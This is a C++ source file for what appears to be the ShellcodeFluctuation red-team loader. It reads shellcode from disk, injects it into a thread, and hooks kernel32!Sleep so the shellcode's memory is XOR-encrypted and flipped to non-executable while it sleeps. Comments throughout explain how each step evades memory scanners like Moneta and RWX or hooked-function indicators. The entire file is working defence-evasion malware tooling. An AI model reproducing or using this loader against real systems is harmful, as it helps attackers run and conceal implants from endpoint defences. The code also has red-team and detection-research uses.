
#include "header.h"
#include <intrin.h>
#include <random>

HookedSleep g_hookedSleep;
FluctuationMetadata g_fluctuationData;
bool g_fluctuate = false;


void WINAPI MySleep(DWORD dwMilliseconds)
{
    const LPVOID caller = (LPVOID)_ReturnAddress();

    //
    // Dynamically determine where the shellcode resides.
    // Of course that we could reuse information collected in `injectShellcode()` 
    // right after VirtualAlloc, however the below invocation is a step towards
    // making the implementation self-aware and independent of the loader.
    //
    initializeShellcodeFluctuation(caller);

    //
    // Encrypt (XOR32) shellcode's memory allocation and flip its memory pages to RW
    //
    shellcodeEncryptDecrypt(caller);


    log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");

    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedSleep.sleepStub;
    buffers.originalBytesSize = sizeof(g_hookedSleep.sleepStub);

    //
    // Unhook kernel32!Sleep to evade hooked Sleep IOC. 
    // We leverage the fact that the return address left on the stack will make the thread
    // get back to our handler anyway.
    //
    fastTrampoline(false, (BYTE*)::Sleep, &MySleep, &buffers);

    // Perform sleep emulating originally hooked functionality.
    ::Sleep(dwMilliseconds);

    //
    // Decrypt (XOR32) shellcode's memory allocation and flip its memory pages back to RX
    //
    shellcodeEncryptDecrypt(caller);

    //
    // Re-hook kernel32!Sleep
    //
    fastTrampoline(true, (BYTE*)::Sleep, &MySleep);
}

std::vector<MEMORY_BASIC_INFORMATION> collectMemoryMap(HANDLE hProcess, DWORD Type)
{
    std::vector<MEMORY_BASIC_INFORMATION> out;
    const size_t MaxSize = (sizeof(ULONG_PTR) == 4) ? ((1ULL << 31) - 1) : ((1ULL << 63) - 1);

    uint8_t* address = 0;
    while (reinterpret_cast<size_t>(address) < MaxSize)
    {
        MEMORY_BASIC_INFORMATION mbi = { 0 };

        if (!VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)))
        {
            break;
        }

        if ((mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ || mbi.Protect == PAGE_READWRITE)
            && ((mbi.Type & Type) != 0))
        {
            out.push_back(mbi);
        }

        address += mbi.RegionSize;
    }

    return out;
}

void initializeShellcodeFluctuation(const LPVOID caller)
{
    if (g_fluctuate && g_fluctuationData.shellcodeAddr == nullptr && isShellcodeThread(caller))
    {
        auto memoryMap = collectMemoryMap(GetCurrentProcess());

        //
        // Iterate over memory pages to find allocation containing the caller, being
        // presumably our Shellcode's thread.
        //
        for (const auto& mbi : memoryMap)
        {
            if (reinterpret_cast<uintptr_t>(caller) > reinterpret_cast<uintptr_t>(mbi.BaseAddress)
                && reinterpret_cast<uintptr_t>(caller) < (reinterpret_cast<uintptr_t>(mbi.BaseAddress) + mbi.RegionSize))
            {
                // Store memory boundary of our shellcode somewhere globally.
                g_fluctuationData.shellcodeAddr = mbi.BaseAddress;
                g_fluctuationData.shellcodeSize = mbi.RegionSize;
                g_fluctuationData.protect = mbi.Protect;
                g_fluctuationData.currentlyEncrypted = false;

                std::random_device dev;
                std::mt19937 rng(dev());
                std::uniform_int_distribution<std::mt19937::result_type> dist4GB(0, 0xffffffff);

                // Use random 32bit key for XORing.
                g_fluctuationData.encodeKey = dist4GB(rng);

                log("[+] Fluctuation initialized.");
                log("    Shellcode resides at 0x", 
                    std::hex, std::setw(8), std::setfill('0'), mbi.BaseAddress, 
                    " and occupies ", std::dec, mbi.RegionSize, 
                    " bytes. XOR32 key: 0x", std::hex, std::setw(8), std::setfill('0'), g_fluctuationData.encodeKey);

                return;
            }
        }

        log("[!] Could not initialize shellcode fluctuation!");
        ::ExitProcess(0);
    }
}

void xor32(uint8_t* buf, size_t bufSize, uint32_t xorKey)
{
    uint32_t* buf32 = reinterpret_cast<uint32_t*>(buf);

    auto bufSizeRounded = (bufSize - (bufSize % sizeof(uint32_t))) / 4;
    for (size_t i = 0; i < bufSizeRounded; i++)
    {
        buf32[i] ^= xorKey;
    }

    for (size_t i = 4 * bufSizeRounded; i < bufSize; i++)
    {
        buf[i] ^= static_cast<uint8_t>(xorKey & 0xff);
    }
}

bool isShellcodeThread(LPVOID address)
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    if (VirtualQuery(address, &mbi, sizeof(mbi)))
    {
        //
        // To verify whether address belongs to the shellcode's allocation, we can simply
        // query for its type. MEM_PRIVATE is an indicator of dynamic allocations such as VirtualAlloc.
        //
        if (mbi.Type == MEM_PRIVATE)
        {
            return ((mbi.Protect & PAGE_EXECUTE_READWRITE)
                || (mbi.Protect & PAGE_EXECUTE_READ)
                || (mbi.Protect == PAGE_READWRITE));
        }
    }

    return false;
}

bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };

    uint32_t addr = (uint32_t)(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
        {
            if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
                return false;

            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        if (buffers == NULL)
            return false;

        if (buffers->originalBytes == nullptr || buffers->originalBytesSize == 0)
            return false;

        dwSize = buffers->originalBytesSize;

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );

    return output;
}

bool hookSleep()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(::Sleep);

    if (!fastTrampoline(true, (BYTE*)::Sleep, &MySleep, &buffers))
        return false;

    return true;
}

void shellcodeEncryptDecrypt(LPVOID callerAddress)
{
    if (g_fluctuate && g_fluctuationData.shellcodeAddr != nullptr && g_fluctuationData.shellcodeSize > 0)
    {
        if (!isShellcodeThread(callerAddress))
            return;

        DWORD oldProt = 0;

        if (!g_fluctuationData.currentlyEncrypted)
        {
            ::VirtualProtect(
                g_fluctuationData.shellcodeAddr,
                g_fluctuationData.shellcodeSize,
                PAGE_READWRITE,
                &g_fluctuationData.protect
            );

            log("[>] Flipped to RW. Encoding...");
        }
        else
        {
            log("[.] Decoding...");
        }

        xor32(
            reinterpret_cast<uint8_t*>(g_fluctuationData.shellcodeAddr),
            g_fluctuationData.shellcodeSize,
            g_fluctuationData.encodeKey
        );

        if (g_fluctuationData.currentlyEncrypted)
        {
            ::VirtualProtect(
                g_fluctuationData.shellcodeAddr,
                g_fluctuationData.shellcodeSize,
                g_fluctuationData.protect,
                &oldProt
            );

            log("[>] Flipped to RX.");
        }

        g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted;
    }
}

bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
{
    HandlePtr file(CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    ), &::CloseHandle);

    if (INVALID_HANDLE_VALUE == file.get())
        return false;

    DWORD highSize;
    DWORD readBytes = 0;
    DWORD lowSize = GetFileSize(file.get(), &highSize);

    shellcode.resize(lowSize, 0);

    return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
}

void runShellcode(LPVOID param)
{
    auto func = ((void(*)())param);

    //
    // Jumping to shellcode. Look at the coment in injectShellcode() describing why we opted to jump
    // into shellcode in a classical manner instead of fancy hooking 
    // ntdll!RtlUserThreadStart+0x21 like in ThreadStackSpoofer example.
    //
    func();
}

bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
{
    //
    // Firstly we allocate RW page to avoid RWX-based IOC detections
    //
    auto alloc = ::VirtualAlloc(
        NULL,
        shellcode.size() + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );

    if (!alloc) 
        return false;

    memcpy(alloc, shellcode.data(), shellcode.size());

    DWORD old;
    
    //
    // Then we change that protection to RX
    // 
    if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
        return false;

    /*
    * We're not setting these pointers to let the hooked sleep handler figure them out itself.
    * 
    g_fluctuationData.shellcodeAddr = alloc;
    g_fluctuationData.shellcodeSize = shellcode.size();
    g_fluctuationData.protect = Shellcode_Memory_Protection;
    */

    shellcode.clear();

    //
    // Example provided in https://github.com/mgeeky/ThreadStackSpoofer showed how we can start
    // our shellcode from temporarily hooked ntdll!RtlUserThreadStart+0x21 .
    // 
    // That approached was a bit flawed due to the fact, the as soon as we introduce a hook within module,
    // even when we immediately unhook it the system allocates a page of memory (4096 bytes) of type MEM_PRIVATE
    // inside of a shared library allocation that comprises of MEM_IMAGE/MEM_MAPPED pool. 
    // 
    // Memory scanners such as Moneta are sensitive to scanning memory mapped PE DLLs and finding amount of memory
    // labeled as MEM_PRIVATE within their region, considering this (correctly!) as a "Modified Code" anomaly.
    // 
    // We're unable to evade this detection for kernel32!Sleep however we can when it comes to ntdll. Instead of
    // running our shellcode from a legitimate user thread callback, we can simply run a thread pointing to our
    // method and we'll instead jump to the shellcode from that method.
    //
    thread.reset(::CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)runShellcode,
        alloc,
        0,
        0
    ));

    return (NULL != thread.get());
}

int main(int argc, char** argv)
{
    if (argc < 3)
    {
        log("Usage: ShellcodeFluctuation.exe <shellcode> <fluctuate>");
        log("<fluctuate>:\n\t-1 - Read shellcode but dont inject it. Run in an infinite loop.");
        log("\t0 - Inject the shellcode but don't hook kernel32!Sleep and don't encrypt anything");
        log("\t1 - Inject shellcode and start fluctuating its memory.");
        return 1;
    }

    std::vector<uint8_t> shellcode;
    bool dontInject = !strcmp(argv[2], "-1");
    if(!dontInject) g_fluctuate = (!strcmp(argv[2], "true") || !strcmp(argv[2], "1"));

    log("[.] Reading shellcode bytes...");
    if (!readShellcode(argv[1], shellcode))
    {
        log("[!] Could not open shellcode file! Error: ", ::GetLastError());
        return 1;
    }

    if (g_fluctuate)
    {
        log("[.] Hooking kernel32!Sleep...");
        if (!hookSleep())
        {
            log("[!] Could not hook kernel32!Sleep!");
            return 1;
        }
    }
    else
    {
        log("[.] Shellcode will not fluctuate its memory pages protection.");
    }

    if (dontInject)
    {
        log("[.] Entering infinite loop (not injecting the shellcode) for memory IOCs examination.");
        log("[.] PID = ", std::dec, GetCurrentProcessId());
        while (true) {}
    }

    log("[.] Injecting shellcode...");

    HandlePtr thread(NULL, &::CloseHandle);
    if (!injectShellcode(shellcode, thread))
    {
        log("[!] Could not inject shellcode! Error: ", ::GetLastError());
        return 1;
    }

    log("[+] Shellcode is now running. PID = ", std::dec, GetCurrentProcessId());

    WaitForSingleObject(thread.get(), INFINITE);
}